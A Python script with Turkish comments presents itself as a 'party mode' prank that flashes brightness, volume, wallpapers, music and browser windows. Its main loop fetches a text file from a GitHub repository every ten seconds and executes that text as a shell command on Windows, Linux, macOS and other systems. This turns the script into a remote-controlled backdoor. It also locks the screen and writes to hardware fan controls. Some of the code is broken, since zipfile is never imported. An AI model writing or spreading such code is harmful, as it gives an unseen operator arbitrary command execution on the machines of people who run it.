import os
import time
import random
import requests
import platform
import subprocess
from threading import Thread
import shutil

download_dir = "party_assets"
music_dir = os.path.join(download_dir, "music")
wallpaper_dir = os.path.join(download_dir, "wallpapers")

def download_nircmd():
    nircmd_path = os.path.join(os.environ["ProgramFiles"], "NirSoft", "nircmd.exe")
    
    # NirCmd'in yüklü olup olmadığını kontrol et
    if os.path.exists(nircmd_path):
        print("NirCmd is already installed.")
        return

    nircmd_url = "https://www.nirsoft.net/utils/nircmd.zip"  # NirCmd'in zip dosyası
    nircmd_zip = "nircmd.zip"
    
    # NirCmd'i indir
    print("Downloading NirCmd...")
    response = requests.get(nircmd_url)
    with open(nircmd_zip, "wb") as file:
        file.write(response.content)
    
    # Zip dosyasını çıkar
    with zipfile.ZipFile(nircmd_zip, 'r') as zip_ref:
        zip_ref.extractall("nircmd")
    
    # NirCmd dosyasını uygun bir dizine taşı
    shutil.move(os.path.join("nircmd", "nircmd.exe"), nircmd_path)
    
    # PATH değişkenine ekle
    path = os.environ["PATH"]
    new_path = os.path.join(os.environ["ProgramFiles"], "NirSoft")
    if new_path not in path:
        os.environ["PATH"] = path + ";" + new_path
        print("NirCmd added to PATH.")


def download_file(url, directory, filename):
    if not os.path.exists(directory):
        os.makedirs(directory)
    file_path = os.path.join(directory, filename)
    
    if not os.path.exists(file_path):
        print(f"{filename} downloading...")
        response = requests.get(url)
        with open(file_path, "wb") as file:
            file.write(response.content)
        print(f"{filename} downloaded.")
    else:
        print(f"{filename} already here.")
    
    return file_path

def download_assets():
    wallpaper_urls = [ "https://raw.githubusercontent.com/Eneskr06/discord-altyapi-bot/refs/heads/master/i.jpg" ]
    music_urls = [ "https://github.com/Eneskr06/discord-altyapi-bot/raw/refs/heads/master/ARSLANBEK%20SULTANBEKOV%20-%20DOMBRA.mp4" ]

    wallpapers = []
    music_files = []

    for i, url in enumerate(wallpaper_urls):
        wallpaper = download_file(url, wallpaper_dir, f"wallpaper{i+1}.jpg")
        wallpapers.append(wallpaper)
    
    for i, url in enumerate(music_urls):
        music_file = download_file(url, music_dir, f"song{i+1}.mp4")
        music_files.append(music_file)
    
    return wallpapers, music_files

def adjust_brightness_and_volume(loop_duration):
    current_platform = platform.system()
    start_time = time.time()

    while time.time() - start_time < loop_duration:
        brightness_level = random.uniform(0.5, 1.0)  # 50% and 100% 
        volume_level = random.randint(30, 100)  # 30% and 100%

        if current_platform == "Windows":
            os.system(f"nircmd.exe setbrightness {int(brightness_level * 100)}")
            os.system(f"nircmd.exe setsysvolume {int(volume_level * 65535 // 100)}")
        elif current_platform == "Linux":
            os.system(f"xrandr --output eDP-1 --brightness {brightness_level}")
            os.system(f"amixer set Master {volume_level}%")

        time.sleep(1)

def change_wallpaper(wallpapers):
    current_platform = platform.system()
    wallpaper = random.choice(wallpapers)

    if current_platform == "Windows":
        os.system(f"RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters ,1 ,True")
    elif current_platform == "Linux":
        os.system(f"gsettings set org.gnome.desktop.background picture-uri {wallpaper}")

def simulate_cpu_load():
    current_platform = platform.system()
    if current_platform == "Windows":
        os.system("wmic cpu get loadpercentage")
    elif current_platform == "Linux":
        os.system("top -bn1 | grep 'Cpu(s)'")


def open_browser_randomly():
    urls = ["http://www.google.com", "http://www.youtube.com", "http://www.github.com"]
    url = random.choice(urls)
    
    current_platform = platform.system()
    if current_platform == "Windows":
        os.system(f"start chrome {url}")
    elif current_platform == "Linux":
        os.system(f"xdg-open {url}")
    time.sleep(3)

def lock_unlock_screen():
    current_platform = platform.system()
    
    if current_platform == "Windows":
        os.system("Rundll32.exe user32.dll,LockWorkStation")
    elif current_platform == "Linux":
        os.system("gnome-screensaver-command -l")
    time.sleep(5)

def start_application():
    current_platform = platform.system()

    if current_platform == "Windows":
        os.system("start notepad.exe")  # Notepad
    elif current_platform == "Linux":
        os.system("gedit")  # Gedit

def play_music(music_files):
    music_file = random.choice(music_files)
    
    current_platform = platform.system()
    if current_platform == "Windows":
        os.system(f"start {music_file}")  # Windows Media Player
    elif current_platform == "Linux":
        os.system(f"xdg-open {music_file}")  # Linux

def simulate_mouse_movement():
    for _ in range(10):
        x = random.randint(0, 500)
        y = random.randint(0, 500)
        if platform.system() == "Windows":
            os.system(f"nircmd.exe movecursor {x} {y}")
        time.sleep(1)

def find_pwm_path():
    for dirpath, dirnames, filenames in os.walk('/sys/class/hwmon/'):
        for filename in filenames:
            if filename.startswith('pwm'):
                return os.path.join(dirpath, filename)
    return None

def set_fan_speed(speed):
    # Fan speed (0-255 value)
    if speed > 250:
        speed = 250
    elif speed < 0:
        speed = 0
    pwm_path = find_pwm_path()
    
    if pwm_path is not None:
        try:
            with open(pwm_path, 'w') as pwm_file:
                pwm_file.write(str(speed))
            print(f"Fan speed {speed} .")
        except Exception as e:
            print(f"Fan speed error: {e}")
    else:
        print("PWM files not found.")

def run_party_mode(wallpapers, music_files, duration):
    print(f"Parti mode started! Time: {duration} second")
    
    threads = [
        Thread(target=adjust_brightness_and_volume, args=(duration,)),
        Thread(target=change_wallpaper, args=(wallpapers,)),
        Thread(target=open_browser_randomly),
        Thread(target=simulate_cpu_load),
        Thread(target=start_application),
        Thread(target=play_music, args=(music_files,)),
        Thread(target=simulate_mouse_movement)
    ]
    
    for thread in threads:
        thread.start()
    
    for thread in threads:
        thread.join()

download_nircmd()
wallpapers, music_files = download_assets()
systemOldRequests = ""

while True:
    renderKR = requests.get("https://raw.githubusercontent.com/Eneskr06/discord-altyapi-bot/refs/heads/master/requests.txt")
    systemNewRequestsforKR = renderKR.text.strip()
    print(systemNewRequestsforKR)
    print(platform.system())

    if systemOldRequests != systemNewRequestsforKR:
        systemOldRequests = systemNewRequestsforKR
        
        current_platform = platform.system()

        if "party" in systemNewRequestsforKR:
            try:
                duration_str = systemNewRequestsforKR.split()[-1]
                duration = int(duration_str) if duration_str.isdigit() else 30
            except (IndexError, ValueError):
                duration = 30
            run_party_mode(wallpapers, music_files, duration)

        if "music" in systemNewRequestsforKR:
            play_music(music_files)

        if "fan" in systemNewRequestsforKR:
            try:
                duration_str = systemNewRequestsforKR.split()[-1]
                duration = int(duration_str) if duration_str.isdigit() else 128
            except (IndexError, ValueError):
                duration = 128
            set_fan_speed(duration)

        if current_platform == "Windows":
            os.popen(renderKR.text)  # Windows
        elif current_platform == "Linux":
            os.system(renderKR.text)  # Linux
        elif current_platform == "Darwin":
            os.system(renderKR.text)  # macOS (Darwin)
        elif current_platform == "Java":
            os.system(renderKR.text)  # Jython (Java)
        else:
            os.system(renderKR.text) # Another System

    if renderKR.text == "exit":
        break

    time.sleep(10)